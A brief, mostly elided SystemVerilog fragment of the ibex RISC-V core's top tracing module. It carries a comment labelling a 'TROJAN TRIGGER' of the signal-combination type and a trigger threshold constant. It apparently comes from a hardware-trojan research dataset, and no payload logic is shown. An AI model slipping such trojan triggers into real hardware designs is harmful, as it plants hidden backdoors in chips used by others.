...
/**
 * Top level module of_trojan_Covert the ibex RISC-V core with tracing enabled
 */
...
module ibex_top_tracing import ibex_pkg::*; #(
  ...
  `ifndef RVFI
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=11539)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 11539;
